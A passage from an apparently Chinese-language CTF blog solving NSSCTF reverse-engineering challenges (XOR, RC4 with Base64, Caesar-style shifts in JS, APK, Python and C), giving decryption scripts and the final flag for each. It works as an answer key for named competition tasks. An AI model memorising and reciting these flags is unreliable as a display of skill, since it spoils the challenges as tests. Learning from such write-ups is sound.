class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">146</span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">135</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"i"</span></span><br><span class="line">                                                <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">136</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">146</span><span class="punctuation">,</span></span><br><span class="line">                                                  <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"charCodeAt"</span></span><br><span class="line">                                                <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                                <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="string">"^"</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"right"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                              <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">149</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">152</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"key"</span></span><br><span class="line">                                            <span class="punctuation">}</span></span><br><span class="line">                                          <span class="punctuation">}</span></span><br><span class="line">                                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                      <span class="punctuation">}</span></span><br><span class="line">                                    <span class="punctuation">}</span></span><br><span class="line">                                  <span class="punctuation">]</span></span><br><span class="line">                                <span class="punctuation">}</span></span><br><span class="line">                              <span class="punctuation">}</span></span><br><span class="line">                            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">163</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">167</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"join"</span></span><br><span class="line">                          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                          <span class="punctuation">{</span></span><br><span class="line">                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Literal"</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">168</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">170</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"raw"</span><span class="punctuation">:</span> <span class="string">"''"</span></span><br><span class="line">                          <span class="punctuation">}</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                      <span class="punctuation">}</span></span><br><span class="line">                    <span class="punctuation">}</span></span><br><span class="line">                  <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">}</span></span><br><span class="line">              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">              <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"ExpressionStatement"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">227</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"expression"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">227</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                    <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">192</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">188</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"console"</span></span><br><span class="line">                    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">189</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">192</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"log"</span></span><br><span class="line">                    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">{</span></span><br><span class="line">                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">193</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">226</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">193</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">195</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"bE"</span></span><br><span class="line">                      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">{</span></span><br><span class="line">                          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Literal"</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">196</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">222</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">"EXXH_MpjxBxYnjggrM~eerv"</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"raw"</span><span class="punctuation">:</span> <span class="string">"'EXXH_MpjxBxYnjggrM~eerv'"</span></span><br><span class="line">                        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">{</span></span><br><span class="line">                          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Literal"</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">223</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">225</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"value"</span><span class="punctuation">:</span> <span class="number">11</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"raw"</span><span class="punctuation">:</span> <span class="string">"11"</span></span><br><span class="line">                        <span class="punctuation">}</span></span><br><span class="line">                      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                    <span class="punctuation">}</span></span><br><span class="line">                  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                <span class="punctuation">}</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"sourceType"</span><span class="punctuation">:</span> <span class="string">"module"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>转换好 的js代码</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bE</span>(<span class="params">str,key</span>){</span><br><span class="line"><span class="keyword">var</span> arr = str.<span class="title function_">split</span>(‘’);</span><br><span class="line"><span class="keyword">return</span> arr.<span class="title function_">map</span>(<span class="function"><span class="params">i</span>=&gt;</span>{</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i.<span class="title function_">charCodeAt</span>()^key);</span><br><span class="line">}).<span class="title function_">join</span>(‘’)</span><br><span class="line">}</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">bE</span>(‘EXXH_mpjx\x7FBxYnjggrM~eerv’,<span class="number">11</span>));</span><br><span class="line">}());</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>进行运行</p><p>NSSCTF{astIsReallyFunny}</p><hr><h2 id="20-SWPUCTF-2021-新生赛-easyapp"><a href="#20-SWPUCTF-2021-新生赛-easyapp" class="headerlink" title="20 [SWPUCTF 2021 新生赛]easyapp"></a>20 [SWPUCTF 2021 新生赛]easyapp</h2><p>🚩flag：<code>NSSCTF{apkYYDS}</code></p><p>💡hint：<code>安卓逆向</code> <code>JAVA</code> <code>XOR</code></p><p>先010查看开头为50 4B 03 04 ，判断为.zip文件，修改后缀。得到.apk文件，使用jadx打开。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">jadx-gui</span><br></pre></td></tr></tbody></table></figure><p>找到三个关键函数：</p><p>![截屏2025-08-10 14.02.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 14.02.42.png)</p><p>![截屏2025-08-10 14.02.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 14.02.53.png)</p><p>![截屏2025-08-10 14.03.03](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 14.03.03.png)</p><p>从第一个关键函数中得到类似于乱码的字符串</p><p>第三个关键函数中我们知道是异或运算，并且key是123456789</p><p>第二个关键函数把key改成了987654321</p><p>得到解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">text =<span class="string">'棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌'</span></span><br><span class="line">key = <span class="number">987654321</span></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">  flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(text[i]) ^ key) % <span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行得到：</p><blockquote><p>NSSCTF{apkYYDS}</p></blockquote><hr><h2 id="21-SWPUCTF-2021-新生赛-PYRE"><a href="#21-SWPUCTF-2021-新生赛-PYRE" class="headerlink" title="21 [SWPUCTF 2021 新生赛]PYRE"></a>21 [SWPUCTF 2021 新生赛]PYRE</h2><p>🚩flag：<code>NSSCTF{more_qwq_lol}</code></p><p>💡hint：<code>RC4</code> <code>Base64</code> <code>Python</code></p><p>下载的附件没有后缀，在010中看到文件头是4D 5A 90 00，推测是.exe文件。</p><p>exe转python。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 题目</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥调度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">a, b</span>):</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    b = hashlib.md5(b.encode()).hexdigest()</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        a.append(i)</span><br><span class="line">        m.append(b[i % <span class="built_in">len</span>(b)])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        n = (n + a[i] + <span class="built_in">ord</span>(m[i])) % <span class="number">256</span></span><br><span class="line">        a[i], a[n] = a[n], a[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪随机数生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">a, b</span>):</span><br><span class="line">    n = c = <span class="number">0</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        n = (n + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        c = (c + a[n]) % <span class="number">256</span></span><br><span class="line">        a[n], a[c] = a[c], a[n]</span><br><span class="line">        t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ a[(a[n] + a[c]) % <span class="number">256</span>])</span><br><span class="line">        s += t</span><br><span class="line">    s = base64.b64encode(s.encode())</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">'input flag pls:'</span>)</span><br><span class="line">s = []</span><br><span class="line">init(s, <span class="string">'bJLVFYw3WI5ncGez'</span>)</span><br><span class="line"><span class="keyword">if</span> Encrypt(s, input_str).decode() == <span class="string">'w4s1PUYsJ8OYwpRXVjvDkVPCgzIEJ27Dt2I='</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'good!'</span>)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥调度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">a, b</span>):</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    b = hashlib.md5(b.encode()).hexdigest()</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        a.append(i)</span><br><span class="line">        m.append(b[i % <span class="built_in">len</span>(b)])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        n = (n + a[i] + <span class="built_in">ord</span>(m[i])) % <span class="number">256</span></span><br><span class="line">        a[i], a[n] = a[n], a[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪随机数生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">a, b</span>):</span><br><span class="line">    n = c = <span class="number">0</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        n = (n + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        c = (c + a[n]) % <span class="number">256</span></span><br><span class="line">        a[n], a[c] = a[c], a[n]</span><br><span class="line">        t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ a[(a[n] + a[c]) % <span class="number">256</span>])</span><br><span class="line">        s += t</span><br><span class="line">    <span class="comment"># s = base64.b64encode(s.encode())</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重现初始化步骤</span></span><br><span class="line">s = []</span><br><span class="line">init(s, <span class="string">'bJLVFYw3WI5ncGez'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码加密结果</span></span><br><span class="line">encoded_str = <span class="string">'w4s1PUYsJ8OYwpRXVjvDkVPCgzIEJ27Dt2I='</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 RC4 解密</span></span><br><span class="line">decrypted_str = Encrypt(s, decoded_bytes.decode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_str)</span><br></pre></td></tr></tbody></table></figure><p>运行得到：</p><blockquote><p>NSSCTF{more_qwq_lol}</p></blockquote><hr><h2 id="22-LitCTF-2023-世界上最棒的程序员"><a href="#22-LitCTF-2023-世界上最棒的程序员" class="headerlink" title="22 [LitCTF 2023]世界上最棒的程序员"></a>22 [LitCTF 2023]世界上最棒的程序员</h2><p>🚩flag：<code>NSSCTF{I_am_the_best_programmer_ever}</code></p><p>💡hint：<code>逆向技术</code> <code>语言逆向</code></p><p>使用ida pro打开，搜索flag。</p><p>![截屏2025-08-10 14.19.58](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 14.19.58.png)</p><hr><h2 id="23-NSSCTF-2022-Spring-Recruit-easy-C"><a href="#23-NSSCTF-2022-Spring-Recruit-easy-C" class="headerlink" title="23 [NSSCTF 2022 Spring Recruit]easy C"></a>23 [NSSCTF 2022 Spring Recruit]easy C</h2><p>🚩flag：<code>NSSCTF{easy_Re}</code></p><p>💡hint：<code>逆向技术</code> <code>语言逆向</code></p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">char</span> a[]=<span class="string">"wwwwwww"</span>;</span><br><span class="line">    <span class="type">char</span> b[]=<span class="string">"d`vxbQd"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to find out the flag</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input flag:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">" %s"</span>,&amp;a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(a)!=<span class="number">7</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NoNoNo\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++){</span><br><span class="line">        a[i]++;</span><br><span class="line">        a[i]=a[i]^<span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a,b)){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NoNoNo\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//flag 记得包上 NSSCTF{} 再提交!!!</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>解题思路分析</strong></p><p>这段C代码的逻辑是：</p><ol><li>用户输入一个7字符的flag</li><li>对每个字符进行两个操作：<ul><li>先执行 <code>a[i]++</code> (ASCII值加1)</li><li>然后执行 <code>a[i] = a[i]^2</code> (ASCII值与2异或)</li></ul></li><li>将处理后的字符串与 <code>"d</code>vxbQd”` 比较</li></ol><p><strong>逆向解密步骤</strong></p><p>要还原原始flag，我们需要逆向这两个操作：</p><ol><li>先逆向异或操作：<code>original ^ 2 = encrypted</code> ⇒ <code>original = encrypted ^ 2</code></li><li>再逆向自增操作：<code>original = encrypted - 1</code></li></ol><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 给定的加密字符串</span></span><br><span class="line">encrypted = <span class="string">"d`vxbQd"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> encrypted:</span><br><span class="line">    <span class="comment"># 逆向操作1：异或2</span></span><br><span class="line">    step1 = <span class="built_in">ord</span>(c) ^ <span class="number">2</span></span><br><span class="line">    <span class="comment"># 逆向操作2：减1</span></span><br><span class="line">    original_char = <span class="built_in">chr</span>(step1 - <span class="number">1</span>)</span><br><span class="line">    flag += original_char</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照题目要求添加NSSCTF{}格式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, <span class="string">f"NSSCTF{{<span class="subst">{flag}</span>}}"</span>)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="24-SWPUCTF-2021-新生赛-re2"><a href="#24-SWPUCTF-2021-新生赛-re2" class="headerlink" title="24 [SWPUCTF 2021 新生赛]re2"></a>24 [SWPUCTF 2021 新生赛]re2</h2><p>🚩flag：<code>NSSCTF{nss_caesar}</code></p><p>💡hint：<code>C</code> <code>语言逆向</code> <code>算法分析</code></p><p>ida pro反编译：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">64</span>]; <span class="comment">// [rsp+20h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">68</span>]; <span class="comment">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+ACh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">"ylqq]aycqyp{"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">  gets(Str);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (Str[i] &lt;= <span class="number">96</span> || Str[i] &gt; <span class="number">98</span>) &amp;&amp; (Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">66</span>) )</span><br><span class="line">      Str[i] -= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Str[i] += <span class="number">24</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(Str, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_404024);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aBingo);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    encrypted = <span class="string">"ylqq]aycqyp{"</span></span><br><span class="line">    flag = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encrypted:</span><br><span class="line">        <span class="comment"># 判断字符是否在加密时的特殊范围内</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">'b'</span>) + <span class="number">24</span> <span class="keyword">and</span> <span class="built_in">ord</span>(c) &gt;= <span class="built_in">ord</span>(<span class="string">'a'</span>) + <span class="number">24</span>) <span class="keyword">or</span> \</span><br><span class="line">                (<span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">'B'</span>) + <span class="number">24</span> <span class="keyword">and</span> <span class="built_in">ord</span>(c) &gt;= <span class="built_in">ord</span>(<span class="string">'A'</span>) + <span class="number">24</span>):</span><br><span class="line">            <span class="comment"># 逆向操作：加密时加24，解密时减24</span></span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 逆向操作：加密时减2，解密时加2</span></span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">2</span>)</span><br><span class="line">        flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span 